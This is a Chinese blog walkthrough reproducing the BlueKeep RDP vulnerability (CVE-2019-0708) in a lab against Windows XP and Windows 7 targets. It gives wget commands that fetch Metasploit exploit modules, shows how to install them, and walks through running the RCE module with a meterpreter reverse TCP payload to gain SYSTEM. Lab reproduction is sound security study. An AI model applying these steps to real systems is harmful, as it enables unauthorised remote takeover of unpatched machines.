# CVE-2019-0708 漏洞复现 - -Zad- - 博客园

> 原文：[`www.cnblogs.com/kuaile1314/p/11480802.html`](https://www.cnblogs.com/kuaile1314/p/11480802.html)

windows RDP 远程代码执行 _CVE-2019-0708 漏洞复现

**一、漏洞概述**

2019 年 5 月 14 日微软官方发布安全补丁,修复了 windows 远程桌面服务的远程代码执行漏洞,该漏洞影响了某些旧版本的 Windows 系统。此漏洞是预身份验证且无需用户交互,这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机。

**二、漏洞影响版本**

Windows 7

Windows server 2008 R2

Windows server 2008

Windows 2003

Windows xp

注:Windows 8 和 windows10 以及之后的版本不受此漏洞影响

**三、漏洞环境搭建**

目标机:windows xp  IP:192.168.45.135

攻击机:kali 系统、\win7(安装 python3 环境,安装 impacket 模块)

条件:目标机开启 3389 端口,关闭防火墙

**四、漏洞复现**

1、 目标 3389 端口,关闭防火墙(或者在防火墙策略中放行 3389 端口)

2、 使用 msf 中相应的模块验证是否存在漏洞

2.1、升级 msf 版本

     apt-get update

     apt-get install metasploit-framework

     注意:不升级 msf,使用 msf v4 版本加载第三方脚本,会报错,可能只因为 cve-2019-0708 的脚本只兼容最新的 msf 版本(msf v5)

2.2、启动 msf,可以看到 msf 当前的版本

![](img/a51ed9fc25b60469852678fac79742d0.png)

 2.3、搜索 cve-2019-0708 脚本

![](img/3dc3e6ef964833fbf7cca77ab6539b3b.png)

  2.4、使用脚本,设置参数

![](img/1088c8a4b8913b90fa6e7f8d8b547cb8.png)

2.5、开始攻击,下图说明目标存在漏洞

 ![](img/31f7687f2bb0ede2dc9f2718299ed091.png)

 二、 0708 最新 payload 复现。

环境：

目标机：win7 sp1 x64 IP：192.168.48.135    （开启 3389,关闭防火墙）

攻击机: kali IP192.168.48  IP：192.168.48.138

1\. 首先我们在 github 上下载最新的 poc， 复制的时候如果目录不存在 ，可以手动 makedir

```
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 
cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/
 cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/
 cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/
 cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/ 
```

2\. 更新我们的 msf

更新以后使用 reload_all 重新加载 0708rdp 利用模块

![](img/077cbc6112ad38f7e9a6e15b118cf249.png)

3.搜索关于 0708 的 poc

![](img/cbd9e10381fb104f95e10664a049620f.png)

4.     use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

　　set payload windows/x64/meterpreter/reversr_tcp

![](img/ccd490ea354b19801a2d0c1ed53d62f2.png)

5.  设置好 IP

![](img/4aaf11db7ae52fa5bd4158adf4b8d25b.png)

6\. 设置好 target 为 3

![](img/a48219e82990edde91749cc9e3373f6d.png)

7.  多 run 几次，就可以成功  我们也可以看到直接是 system 权限

![](img/c8cb12562880281638c37b90ddc6cd27.png)